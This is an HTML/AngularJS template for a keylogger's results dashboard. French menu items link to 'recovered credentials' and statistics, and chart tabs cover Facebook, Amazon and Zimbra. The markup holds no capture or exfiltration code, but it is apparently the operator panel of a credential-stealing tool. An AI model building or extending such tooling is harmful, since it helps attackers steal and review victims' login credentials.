<!DOCTYPE html>

<html ng-app="Application">
    <head>
        <meta charset="utf-8" />
        <title>KeyLogger</title>
        <link rel="stylesheet" href="/static/css/mycss.css" charset="utf-8">
        <link rel="stylesheet" href="/static/angular-material/angular-material.css">
        <script src="static/angular/angular.min.js"></script>
        <script src="static/angular-animate/angular-animate.min.js"></script>
        <script src="static/angular-aria/angular-aria.min.js"></script>
        <script src="static/angular-material/angular-material.min.js"></script>
        <script src="static/angular-route/angular-route.min.js"></script>
        <script src="static/angular-messages/angular-messages.js"></script>
        <script src="static/js/svg-assets-cache.js"></script>
        <script src="static/js/myjs.js"></script>
        <script src="static/chart.js/dist/Chart.min.js"></script>
        <link rel="stylesheet" href="static/font-awesome/css/font-awesome.min.css"></script>
        <link rel="icon" type="image/png" href="static/img/icone.png" />

    </head>

    <body >


<md-sidenav
    class="md-sidenav-left"
    md-component-id="left"
    md-whiteframe="4"
    style="background: rgb(63,81,181); width: 20%;">

  <md-toolbar style="background: rgb(40,53,147);">
    <h1 class="md-toolbar-tools">Menu</h1>
  </md-toolbar>
  <md-content ng-controller="LeftCtrl" style="background: rgb(63,81,181); text-align: left;">

    <md-toolbar id="item_menu" >
      <span onclick= "window.location.href = 'toto'"; id="text_menu"><i class="fa fa-id-card-o" aria-hidden="true"></i>
        <a style="padding-left: 10px;">Identifiants récupérés</a></span>
    </md-toolbar>

    <md-toolbar id="item_menu">
      <span onclick= "window.location.href = '#'"; id="text_menu"><i class="fa fa-bar-chart" aria-hidden="true"></i>
          <a style="padding-left: 10px;">Statistiques et graphes</a></span>
    </md-toolbar>


    <md-button ng-click="close()" id="menu_button" class="md-raised md-primary">
      Fermer
    </md-button>
  </md-content>
</md-sidenav>

<div ng-cloak="" class="toolbardemoBasicUsage" >
<md-content ng-controller="LeftCtrl">
  <md-toolbar class="md-hue-2">
      <div class="md-toolbar-tools">
            <md-button ng-click="toggleLeft()" class="md-icon-button" aria-label="Settings">
              <md-icon md-svg-icon="img/icons/menu.svg" style="color: greenyellow;"></md-icon>
            </md-button>

        <h2>
          <span>Keylogger results </span>
        </h2>
        <span flex=""></span>

      </div>
    </md-toolbar>
  </md-content>
</div>
    <div ng-cloak="" class="tabsdemoDynamicHeight" ng-controller="FirstController as ctrl" ng-show="true">
        <md-content>
          <md-tabs md-dynamic-height="" md-border-bottom="">
            <md-tab label="Tous">
              <md-content class="md-padding">
              <div layout="row">

                  <div flex=50 ng-controller="ChartController as chart" style="width: 50%; margin-left: auto; margin-right: auto;height: auto;" >

                  <canvas id="myChart"  ></canvas>
                  </div>
                <hr>
                  <div flex=50 ng-controller="SiteController as chart" style="width: 50%; margin-left: auto; margin-right: auto;height: auto;" >

                  <canvas id="myChart1"  ></canvas>
                </div>
              <hr>
              </div>
              </md-content>
            </md-tab>

            <md-tab label="Facebook">
              <md-content class="md-padding">
              <div layout="row">
                  <div flex=50 ng-controller="SiteController as chart" style="width: 50%; margin-left: auto; margin-right: auto;height: auto;" >

                  <canvas id="myChart2"  ></canvas>
                  </div>
              </div>
              </md-content>
            </md-tab>

            <md-tab label="Amazon">
              <md-content class="md-padding">
              <div layout="row">
                  <div flex=50 ng-controller="SiteController as chart" style="width: 50%; margin-left: auto; margin-right: auto;height: auto;" >

                  <canvas id="myChart3"  ></canvas>
                  </div>
              </div>
              </md-content>
            </md-tab>
            <md-tab label="Zimbra">
              <md-content class="md-padding">
              <div layout="row">
                  <div flex=50 ng-controller="SiteController as chart" style="width: 50%; margin-left: auto; margin-right: auto;height: auto;" >

                  <canvas id="myChartZ"  ></canvas>
                  </div>
              </div>
              </md-content>
            </md-tab>



          </md-tabs>

      </div>
    </body>
</html>
